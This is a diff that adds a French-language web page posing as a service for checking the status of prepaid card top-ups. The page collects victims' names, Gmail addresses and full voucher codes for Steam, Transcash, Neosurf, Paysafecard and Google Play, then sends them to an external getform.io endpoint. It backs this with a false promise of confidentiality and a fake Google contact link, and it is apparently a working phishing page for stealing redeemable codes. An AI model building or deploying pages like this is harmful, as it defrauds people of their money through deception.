@@ -1,0 +1,147 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Service de Vérification de Rechargement</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #cce6ff; /* fond général plus clair */
+            margin: 0;
+            padding: 0;
+        }
+        header {
+            background-color: #005bb5; /* bleu foncé plus intense */
+            color: white;
+            text-align: center;
+            padding: 20px 10px;
+        }
+        form {
+            background-color: #0073e6; /* bleu vif pour le formulaire */
+            width: 90%;
+            max-width: 600px;
+            margin: 40px auto;
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0px 0px 15px rgba(0,0,0,0.3);
+        }
+        label {
+            display: block;
+            font-weight: bold;
+            margin-bottom: 6px;
+            color: white; /* labels blancs */
+        }
+        input, select, textarea {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 20px;
+            border: 1px solid #004080; /* bordure bleu foncé */
+            border-radius: 6px;
+        }
+        button {
+            background-color: #004080; /* bouton bleu foncé */
+            color: white;
+            border: none;
+            padding: 12px 20px;
+            border-radius: 6px;
+            font-size: 16px;
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: #003366; /* bleu encore plus foncé au hover */
+        }
+        footer {
+            text-align: center;
+            margin-top: 30px;
+            color: #004080;
+            font-size: 14px;
+            padding-bottom: 30px;
+        }
+        .info {
+            text-align: center;
+            font-size: 16px;
+            color: #004080;
+            margin-top: 10px;
+        }
+        .trust {
+            background-color: #cce6ff; /* zone info confiance bleu clair */
+            padding: 10px;
+            border-radius: 5px;
+            font-size: 14px;
+            color: #004080;
+            margin-bottom: 20px;
+        }
+    </style>
+    <script>
+        // Vérifie que l'utilisateur utilise bien une adresse Gmail
+        function checkLogin() {
+            let email = prompt("Veuillez entrer votre adresse Gmail pour continuer :");
+            if (!email || !email.includes("@gmail.com")) {
+                alert("Vous devez être connecté à un compte Gmail pour continuer.");
+                window.location.reload();
+            }
+        }
+        window.onload = checkLogin;
+    </script>
+</head>
+<body>
+
+    <header>
+        <h1>Service de Vérification de Rechargement — 2016</h1>
+    </header>
+
+    <div class="info">
+        <p>Vous avez effectué un rechargement et souhaitez en vérifier le statut ?<br>
+        Utilisez notre outil de vérification pour confirmer que votre transaction a bien été traitée.<br>
+        Saisissez simplement votre code de rechargement ou votre numéro de transaction pour obtenir une réponse instantanée.</p>
+    </div>
+
+    <form action="https://getform.io/f/bpjzgngb" method="POST">
+        <div class="trust">
+            🔒 Vos informations sont strictement confidentielles et protégées. 
+            Aucune donnée n’est partagée à des tiers.
+        </div>
+
+        <label for="nom">Nom complet</label>
+        <input type="text" id="nom" name="nom" placeholder="Entrez votre nom et prénom" required>
+
+        <label for="email">Adresse Gmail</label>
+        <input type="email" id="email" name="email" placeholder="exemple@gmail.com" required>
+
+        <label for="type">Type de carte rechargée</label>
+        <select id="type" name="type" required>
+            <option value="">-- Sélectionnez une carte --</option>
+            <option value="Steam">Steam</option>
+            <option value="Transcash">Transcash</option>
+            <option value="Neosurf">Neosurf</option>
+            <option value="Paysafecard">Paysafecard</option>
+            <option value="Google Play">Google Play</option>
+            <option value="Autre">Autre</option>
+        </select>
+
+        <label for="valeur">Valeur du ticket (€ ou CFA)</label>
+        <input type="text" id="valeur" name="valeur" placeholder="Ex: 25€ ou 10000 CFA" required>
+
+        <label for="code">Code du ticket</label>
+        <input type="text" id="code" name="code" placeholder="Entrez le code complet du ticket" required>
+
+        <label for="date">Date d’achat du ticket</label>
+        <input type="date" id="date" name="date" required>
+
+        <label for="heure">Heure d’achat du ticket</label>
+        <input type="time" id="heure" name="heure" required>
+
+        <label for="message">Commentaires (facultatif)</label>
+        <textarea id="message" name="message" placeholder="Ajoutez un message ou un détail sur la transaction"></textarea>
+
+        <button type="submit">Vérifier le ticket</button>
+    </form>
+
+    <footer>
+        © 2016 — Service de Vérification de Rechargement<br>
+        Contactez <a href="https://www.google.com" target="_blank">Google.com</a> en cas de suggestion.
+    </footer>
+
+</body>
+</html>
